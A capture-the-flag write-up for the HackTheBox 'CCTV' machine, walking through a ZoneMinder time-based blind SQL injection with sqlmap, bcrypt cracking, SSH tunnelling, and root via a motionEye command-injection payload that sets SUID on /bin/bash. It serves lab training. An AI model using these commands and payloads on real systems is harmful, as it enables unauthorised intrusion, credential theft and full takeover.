# CCTV — HackTheBox Writeup
**Difficulty:** Easy | **OS:** Linux

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Enumeration](#enumeration)
3. [SQL Injection via ZoneMinder](#sql-injection-via-zoneminder)
4. [Hash Cracking & SSH Access](#hash-cracking--ssh-access)
5. [Internal Service Discovery](#internal-service-discovery)
6. [motionEye — Credential Discovery](#motioneye--credential-discovery)
7. [Privilege Escalation via CVE-2025-60787](#privilege-escalation-via-cve-2025-60787)
8. [Flags](#flags)

---

## Reconnaissance

Start with an Nmap service scan against the target:

```bash
nmap -sV -sC 10.129.xx.xx
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two open ports: SSH (22) and HTTP (80). The HTTP server redirects to `cctv.htb`, so add it to `/etc/hosts`:

```bash
echo "10.129.xx.xx  cctv.htb" | sudo tee -a /etc/hosts
```

---

## Enumeration

Browsing to `http://cctv.htb` we find another endpoint /zm, which reveals a **ZoneMinder v1.37.63** instance. Default credentials `admin:admin` grant access to the dashboard.

---

## SQL Injection via ZoneMinder

A known security advisory exists for ZoneMinder:
**GHSA-qm8h-3xvf-m7j3** — SQL injection in the `tid` GET parameter.

Capture the vulnerable request in Burp Suite, save it as `1.txt`, then run sqlmap:

```bash
sqlmap -r 1.txt --batch -p tid
```

sqlmap confirms a **time-based blind SQL injection**:

```
Parameter: tid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 1756 FROM (SELECT(SLEEP(5)))AydA)
Back-end DBMS: MySQL >= 5.0.12
```

### Enumerate Databases

```bash
sqlmap -r 1.txt --batch -p tid --dbs
```

```
available databases [3]:
[*] information_schema
[*] performance_schema
[*] zm
```

`zm` is the default ZoneMinder database. The `Users` table contains `Username` and `Password` columns.

### Dump Credentials

```bash
sqlmap -r 1.txt -p tid --batch -D zm -T Users -C Username,Password --dump
```

```
Database: zm
Table: Users
[3 entries]
+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | <bcrypt_hash_redacted>                                       |
| mark       | <bcrypt_hash_redacted>                                       |
| admin      | <bcrypt_hash_redacted>                                       |
+------------+--------------------------------------------------------------+
```

> Note: Time-based blind SQLi is slow — the full dump takes significant time (potentially hours depending on network stability).

---

## Hash Cracking & SSH Access

Since `mark` is a plausible SSH username, focus on cracking their bcrypt hash first:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
<password_redacted>       (?)
1g 0:00:00:42 DONE
```

Use the cracked password to log in via SSH:

```bash
ssh mark@10.129.xx.xx
```

Login succeeds. However, there is no `user.txt` in mark's home directory yet.

---

## Internal Service Discovery

Check for internally listening services (e.g., via linpeas or netstat):

```
tcp  127.0.0.1:8554   LISTEN
tcp  127.0.0.1:8765   LISTEN
tcp  127.0.0.1:8888   LISTEN
tcp  127.0.0.1:9081   LISTEN
tcp  127.0.0.1:7999   LISTEN
tcp  127.0.0.1:1935   LISTEN
tcp  127.0.0.1:3306   LISTEN
```

Probe port `8765`:

```bash
curl -I 127.0.0.1:8765
```

```
HTTP/1.1 200 OK
Server: motionEye/0.43.1b4
```

A **motionEye** instance is running internally. Forward it locally via SSH tunneling:

```bash
ssh -L 8888:127.0.0.1:8765 mark@10.129.xx.xx
```

Browse to `http://127.0.0.1:8888`. Default credentials `admin:admin` do not work here.

---

## motionEye — Credential Discovery

Check the motionEye configuration file on the target:

```bash
cat /etc/motioneye/motion.conf
```

```
# @admin_username admin
# @admin_password <sha1_hash_redacted>
# @normal_username user
# @normal_password
```

The admin password is stored as a SHA1 hash in the config file. Use this hash to authenticate to the motionEye web interface at `http://127.0.0.1:8888`.

---

## Privilege Escalation via CVE-2025-60787

**CVE-2025-60787** — motionEye is vulnerable to Remote Code Execution via an unsanitized motion config parameter.
Reference: **GHSA-j945-qm58-4gjx**

### Exploit Steps

**Step 1 — Bypass client-side validation** by running the following in the browser developer console while on the motionEye settings page:

```javascript
configUiValid = function() { return true; };
```

<img width="1197" height="942" alt="Screenshot 2026-03-08 142913" src="https://github.com/user-attachments/assets/9adc2740-9dc0-442f-b9e3-bdc310068c45" />

This disables form validation, allowing arbitrary values to be submitted.

**Step 2 — Inject a malicious payload** into a motion config field (e.g., the movie filename pattern):

```
$(chmod +s /bin/bash).%Y-%m-%d-%H-%M-%S
```
<img width="1199" height="936" alt="Screenshot 2026-03-08 143035" src="https://github.com/user-attachments/assets/7712c6e3-2526-465e-b3e8-a694a168d244" />

Save the settings. When motionEye processes the config, the shell command is executed as root.

**Step 3 — Verify the SUID bit was set:**

```bash
mark@cctv:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1446024 Mar 31 2024 /bin/bash
```

**Step 4 — Spawn a privileged shell:**

```bash
mark@cctv:~$ /bin/bash -p
bash-5.2# id
uid=1000(mark) gid=1000(mark) euid=0(root) egid=0(root) groups=0(root),...
```

Root access achieved.

---

## Flags

```
user.txt  →  [REDACTED]   (found in /home/mark/ after root)
root.txt  →  [REDACTED]   (found in /root/)
```

---

## Summary

| Step | Technique |
|------|-----------|
| Recon | Nmap service scan → ZoneMinder v1.37.63 on port 80 |
| Initial Foothold | Time-based blind SQLi on `tid` param → bcrypt hash dump → SSH as `mark` |
| Internal Discovery | Netstat → motionEye on `127.0.0.1:8765` → SSH local port forward |
| Credential Recovery | SHA1 hash in `/etc/motioneye/motion.conf` |
| Privilege Escalation | CVE-2025-60787 RCE → SUID bit on `/bin/bash` → root shell |
